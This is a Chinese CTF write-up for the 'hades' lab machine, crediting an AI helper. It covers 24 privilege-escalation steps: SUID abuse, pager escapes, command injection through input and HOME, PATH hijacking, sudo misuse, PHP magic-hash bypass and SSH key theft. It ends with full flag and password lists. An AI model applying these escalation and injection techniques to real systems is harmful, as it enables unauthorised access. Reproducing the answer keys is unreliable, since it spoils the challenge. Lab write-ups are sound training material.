> 辅助AI：KIMI-K3

## Mission 01: hacker -> acantha

- **任务**：acantha 留了个 gift 给我们。

`/opt/gift_hacker` 是个 root 的 suid 程序，跑一下直接变成 acantha 的 shell。

```bash
hacker@hades:~$ ls -la /opt/gift_hacker
-rwSr-s--- 1 root hacker 16064 May  4 07:52 /opt/gift_hacker
hacker@hades:~$ /opt/gift_hacker
$ id
uid=2043(acantha) gid=2001(hacker) groups=2001(hacker)
$ cat /pazz/acantha_pass.txt
mYYLhLBSkrzZqFydxGkn
```

- **acantha**: `mYYLhLBSkrzZqFydxGkn`

## Mission 02: acantha -> alala

- **任务**：插入正确数字就给密码，其实就是猜一个 PIN。

家目录有个 `guess`，本地反编译看到只读了一个数跟 `0x16f8` 比，即 5880。

```bash
acantha@hades:~$ echo 5880 | ./guess
Enter PIN code:
 DsYzpJQrCEndEWIMxWxu
```

- **alala**: `DsYzpJQrCEndEWIMxWxu`

## Mission 03: alala -> althea

- **任务**：althea 喜欢读 Linux 帮助。

家目录 `read` 是个 suid 程序，跑起来其实是 `man man`，pager 里 `!` 逃逸拿 shell。

```bash
alala@hades:~$ ./read
(man 界面里)
!cat /pwned/alala/althea_pass.txt
ObxEmwisYjERrDfvSbdA
```

- **althea**: `ObxEmwisYjERrDfvSbdA`

## Mission 04: althea -> andromeda

- **任务**：andromeda 留了个列目录的程序。

`lsme` 提示 `Enter file to check:` 读一行做 `ls -la <输入>`，注入即可；注意 `scanf("%s")` 遇空格截断，命令里别用空格。

```bash
althea@hades:~$ printf 'x;cat<andromeda_pass.txt\n' | ./lsme
OTWGTbHzrxhYFSTlKcOt
```

- **andromeda**: `OTWGTbHzrxhYFSTlKcOt`

## Mission 05: andromeda -> anthea

- **任务**：anthea 让我们别忘了自己是谁。

`uid` 这个 suid 程序内部是 `system("id")`，PATH 劫持。但 `/tmp` 是 noexec，得用可写的 `/run/lock`。

```bash
andromeda@hades:~$ echo '#!/bin/sh
cat /pwned/andromeda/anthea_pass.txt' > /run/lock/id
andromeda@hades:~$ chmod +x /run/lock/id
andromeda@hades:~$ PATH=/run/lock:$PATH ./uid
yWFLtSNQArEBTHtWgkKd
andromeda@hades:~$ rm /run/lock/id
```

- **anthea**: `yWFLtSNQArEBTHtWgkKd`

## Mission 06: anthea -> aphrodite

- **任务**：aphrodite 痴迷数字 94。

`obsessed` 读环境变量 `MYID`，取第一个字符的 ASCII 值。`^` 的 ASCII 是 94，过了就丢 shell。

```bash
anthea@hades:~$ MYID='^' ./obsessed
Current MYID: 94
$ cat /pwned/anthea/aphrodite_pass.txt
HPJVaqRzieKQeyyATsFv
```

- **aphrodite**: `HPJVaqRzieKQeyyATsFv`

## Mission 07: aphrodite -> ariadne

- **任务**：ariadne 知道我们 HOME 里放了啥。

`homecontent` 把 `$HOME` 拼进命令里执行，注入 HOME 即可。

```bash
aphrodite@hades:~$ HOME=';cat ariadne_pass.txt' ./homecontent
The content of your HOME is:
... ls 输出 ...
iNgNazuJrmhJKWixktzk
```

- **ariadne**: `iNgNazuJrmhJKWixktzk`

## Mission 08: ariadne -> arete

- **任务**：arete 允许我们用 cp。

`sudo -l`：(arete) NOPASSWD: /bin/cp。/run/lock 里有个 arete_pass.txt（440），直接 cp 会被目标权限带过去读不到；先建个 666 文件再覆盖，权限就保留了。

```bash
ariadne@hades:~$ install -m 666 /dev/null /tmp/x && sudo -u arete /bin/cp /run/lock/arete_pass.txt /tmp/x && cat /tmp/x
QjrIovHacmGWxVjXRLmA
```

- **arete**: `QjrIovHacmGWxVjXRLmA`

## Mission 09: arete -> artemis

- **任务**：artemis 给了我们某个 bin 当礼物。

`sudo -l`：(artemis) NOPASSWD: /sbin/capsh。capsh 的 `--` 之后参数会交给 /bin/bash。

```bash
arete@hades:~$ sudo -u artemis /sbin/capsh -- -c 'cat /usr/share/artemis_pass.txt'
HIiaojeORLaJBVSPDDCZ
```

- **artemis**: `HIiaojeORLaJBVSPDDCZ`

## Mission 10: artemis -> asia

- **任务**：需要 /bin/bash 才能让 asia 给密码。

artemis 登录 shell 是 rbash，`./restricted` 跑不动（带 `/` 的命令被禁）。先 `bash` 进普通 bash，再 `SHELL=/bin/bash ./restricted`。

```bash
artemis@hades:~$ bash
artemis@hades:~$ SHELL=/bin/bash ./restricted
Your SHELL is: /bin/bash
djqWtkLisbQlrGtLYHCv
```

- **asia**: `djqWtkLisbQlrGtLYHCv`

## Mission 11: asia -> asteria

- **任务**：asteria 教我们写 python。

`sudo -l`：(asteria) NOPASSWD: /usr/bin/python3。直接 -c 读文件。

```bash
asia@hades:~$ sudo -u asteria /usr/bin/python3 -c "print(open('/usr/share/doc/asteria_pass.txt').read())"
hawMVJCYrBgoDAMVhuwT
```

- **asteria**: `hawMVJCYrBgoDAMVhuwT`

## Mission 12: asteria -> astraea

- **任务**：astraea 信 magic。

`/var/www/html/sihiri.php` 把输入 md5 后用 `==` 比较，经典 0e 魔术哈希。`240610708` 的 md5 是 `0e462...` 全数字。

```bash
asteria@hades:~$ curl -s 'http://127.0.0.1/sihiri.php?pass=240610708'
nZkEYtjvHElOtupXKzTE
```

- **astraea**: `nZkEYtjvHElOtupXKzTE`

## Mission 13: astraea -> atalanta

- **任务**：astraea 的 ssh 被 ForceCommand 锁死，但本机开了 vsftpd。

astraea 走 ssh 只会 echo 一行，但用 FTP 登录能进她家目录，直接 get atalanta.txt。

```bash
asteria@hades:~$ curl -s ftp://127.0.0.1/atalanta.txt --user 'astraea:nZkEYtjvHElOtupXKzTE'
mUcSNQlaXtwSvGcgeTYZ
```

- **atalanta**: `mUcSNQlaXtwSvGcgeTYZ`

## Mission 14: atalanta -> athena

- **任务**：athena 给了程序没给源码（给的 weird.c 是坑）。

`weird` 会把 `/var/lib/me` 的内容写到 `$HOME` 指向的文件里（euid=athena），然后 chmod 把文件改成 620 让我们读不到。先建个 666 文件再让 HOME 指过去，chmod 对别人属主的文件会失败，权限就保留了。

```bash
atalanta@hades:~$ install -m 666 /dev/null /tmp/u63
atalanta@hades:~$ HOME=/tmp/u63 ./weird
atalanta@hades:~$ cat /tmp/u63
kmQMpZsXgOsnzGReRcoV
```

- **athena**: `kmQMpZsXgOsnzGReRcoV`

## Mission 15: athena -> aura

- **任务**：aura 给我们用她的新脚本。

`sudo -l`：(aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh。脚本读一行 `$hackme` 当命令执行，但过滤了 `e/o/?` 等字符。`printf` 不含过滤字符，直接回显密码。

```bash
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
printf
TiqpedAFjwmVyBlYpzRh
```

- **aura**: `TiqpedAFjwmVyBlYpzRh`

## Mission 16: aura -> aegle

- **任务**：aegle 对数字记忆好。

`numbers` 一个一个读数字比较。逐位爆破（每位试 0-9，看 "Number OK" 数量增加），最终密码是 1231239111126。

```bash
aura@hades:~$ ./numbers
Enter one number:
1
Number OK
... (逐位试出 1 2 3 1 2 3 9 1 1 1 1 2 6)
Enter next number:
6
Number OK
YRturIymmHSdBmEClEGe
```

- **aegle**: `YRturIymmHSdBmEClEGe`

## Mission 17: aegle -> calliope

- **任务**：calliope 喜欢被人看。

`sudo -l`：(calliope) NOPASSWD: /bin/cat。家目录里直接没有 calliope_pass.txt，但有 `.ssh/id_rsa`。用私钥 ssh 登录 calliope。

```bash
aegle@hades:~$ sudo -u calliope /bin/cat /pwned/calliope/.ssh/id_rsa > /tmp/calli.key
aegle@hades:~$ chmod 600 /tmp/calli.key
aegle@hades:~$ ssh -i /tmp/calli.key calliope@127.0.0.1
calliope@hades:~$
```

- **calliope**: ssh 私钥登录（密码无）

## Mission 18: calliope -> calypso

- **任务**：calypso 常用 write 交流。

`writeme` 默认说 "Cannot send you my pass"。先把终端设成可写（mesg y），再跑 writeme，密码夹在输出里冒出来。本机没 mesg，等价 `chmod o+w $(tty)`。

```bash
calliope@hades:~$ chmod o+w $(tty)
calliope@hades:~$ ./writeme
Cannot send you my pass!...TAMYefoHcCPmexwImodo...
```

- **calypso**: `TAMYefoHcCPmexwImodo`

## Mission 19: calypso -> cassandra

- **任务**：cassandra 想上电视。

家目录 `cassy.wav`（8.7MB），90 秒 48kHz mono，是 SSTV 慢扫描电视信号。用在线 SSTV 解码器（decipher.wiki/sstv）解码，图里是密码。

```bash
calypso@hades:~$ scp -P 6666 cassy.wav kali@...
# 丢到 decipher.wiki/sstv 解码，图里显示密码
```

- **cassandra**: `CKzlnvmHQz`

## Mission 20: cassandra -> cassiopeia

- **任务**：cassiopeia 能看到看不见的东西。

家目录 `here.txt` 是一段 base64，解码后内容是一堆空白字符——whitespace 隐写。用 `stegsnow` 解码即可。

```bash
cassandra@hades:~$ cat here.txt | base64 -d > here_flag
cassandra@hades:~$ stegsnow here_flag
gRqFnHblmZVZSfegPLvO
```

- **cassiopeia**: `gRqFnHblmZVZSfegPLvO`

## Mission 21: cassiopeia -> clio

- **任务**：clio 讨厌空格。

`sudo -l`：(clio) NOPASSWD: /bin/bash -c /usr/local/src/differences.sh。脚本读一行，用 `IFS=0` 分割成两个文件名跑 `diff`，有空格就拒绝。clio 的密码在 `/var/local/clio_pass.txt`，用字符 `0` 做分隔符绕过空格限制。

```bash
cassiopeia@hades:~$ echo "/var/local/clio_pass.txt0/dev/null" | sudo -u clio /bin/bash -c /usr/local/src/differences.sh
1d0
< cqJqRPaUtuoUYXbaxnZq
```

- **clio**: `cqJqRPaUtuoUYXbaxnZq`

## Mission 22: clio -> cybele

- **任务**：cybele 用她的"姓"做密码。

"姓"指的是 /etc/passwd 里的 GECOS 字段（第 5 个字段）。

```bash
clio@hades:~$ cat /etc/passwd | grep cybele
cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash
```

密码就是 GECOS 字段的值。

- **cybele**: `UICacOPmJMWbKyPwNZod`

## Mission 23: cybele -> cynthia

- **任务**：cynthia 能看到别人看不到的东西。

家目录 `fun.png`（3.2MB，1600x1980 RGBA），用 LSB 隐写在红色通道最低位。提取 Red plane 0，左上角有文字，OCR 即可。

```bash
cybele@hades:~$ scp -P 6666 fun.png kali@...
# 本地用 Python 提取 R 通道 bit0
python3 -c "from PIL import Image; img=Image.open('fun.png'); r,_,_,_=img.split(); out=Image.new('L',(1600,1980)); [out.putpixel((x,y),(r.getpixel((x,y))&1)*255) for y in range(1980) for x in range(1600)]; out.crop((0,0,600,80)).save('red0.png')"
# 识别出 QHLjXdGSiRShtWpMwFjj
```

- **cynthia**: `QHLjXdGSiRShtWpMwFjj`

## Mission 24: cynthia -> daphne

- **任务**：daphne 说过 Gemini？gem-evil.hmv？WTF？

靶机在 IPv6 [::1]:1965 跑了个 Gemini 服务。用 Python TLS 连上去发 gemini 请求，返回密码。

```bash
cynthia@hades:~$ python3 -c "
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = socket.create_connection(('::1', 1965))
ss = ctx.wrap_socket(s, server_hostname='gem-evil.hmv')
ss.sendall(b'gemini://gem-evil.hmv/\r\n')
import time; time.sleep(3)
print(ss.recv(4096).decode())
"
20 text/gemini
# Welcome to mi Gemini Server!
## What are you looking for?
EkdtKuXCJjlFKFpKgddX
```

- **daphne**: `EkdtKuXCJjlFKFpKgddX`

---

# Flag

```
01. acantha:     ^CaEuVJtJjaCwZtuuAFD^
02. alala:       ^gTdGmkwhDrCqKrDQpxH^
03. althea:      ^btDtPAPzSiXmoHItpqX^
04. andromeda:   ^xzsHGrOeNctIZLGKzWq^
05. anthea:      ^AcFLuAjhydNKIkPoFLL^
06. aphrodite:   ^fmPlsDByrwmEpRAKgeP^
07. ariadne:     ^FuGFaFNhtKNxUInxAtd^
08. arete:       ^qmrrbGUXLTqLFDyCDlx^
09. artemis:     ^SegGdzPgnNdGAmKjnsa^
10. asia:        ^ngXdULWFWKCGtgxAQNv^
11. asteria:     ^xSRhIftMsAwWvBAnqNZ^
12. astraea:     ^KssHQIAFsxUamecyXIUk^
13. atalanta:    ^XXZbDJTQQWCHJWTGeOw^
14. athena:      ^oGwmbNYdtHwJgznZdur^
15. aura:        ^YFMNmPnlKNpnWiYOhYy^
16. aegle:       ^XCwOqgVvWpDVwPVVUJa^
17. calliope:    ^rFWOMwBJDidqSNtEJGJ^
18. calypso:     ^pssqdorRTYuTKuQBOYd^
19. cassandra:   ^lntvcYNlazEljOyZYKz^
20. cassiopeia:  ^GyWbcpEpqMsqMsjilzX^
21. clio:        ^XUJbvPwAZYgoUgkpeSv^
22. cybele:      ^bTsTIOmJELcaxEiIaCA^
23. cynthia:     ^ZRSCKeYYlHkCEiHsEOI^
24. daphne:      ^ieOhnUKZlYZSSrIPgaJ^
```

# Pass

```
01: acantha/mYYLhLBSkrzZqFydxGkn
02: alala/DsYzpJQrCEndEWIMxWxu
03: althea/ObxEmwisYjERrDfvSbdA
04: andromeda/OTWGTbHzrxhYFSTlKcOt
05: anthea/yWFLtSNQArEBTHtWgkKd
06: aphrodite/HPJVaqRzieKQeyyATsFv
07: ariadne/iNgNazuJrmhJKWixktzk
08: arete/QjrIovHacmGWxVjXRLmA
09: artemis/HIiaojeORLaJBVSPDDCZ
10: asia/djqWtkLisbQlrGtLYHCv
11: asteria/hawMVJCYrBgoDAMVhuwT
12: astraea/nZkEYtjvHElOtupXKzTE
13: atalanta/mUcSNQlaXtwSvGcgeTYZ
14: athena/kmQMpZsXgOsnzGReRcoV
15: aura/TiqpedAFjwmVyBlYpzRh
16: aegle/YRturIymmHSdBmEClEGe
17: calliope/(ssh 私钥)
18: calypso/TAMYefoHcCPmexwImodo
19: cassandra/CKzlnvmHQz
20: cassiopeia/gRqFnHblmZVZSfegPLvO
21: clio/cqJqRPaUtuoUYXbaxnZq
22: cybele/UICacOPmJMWbKyPwNZod
23: cynthia/QHLjXdGSiRShtWpMwFjj
24: daphne/EkdtKuXCJjlFKFpKgddX
```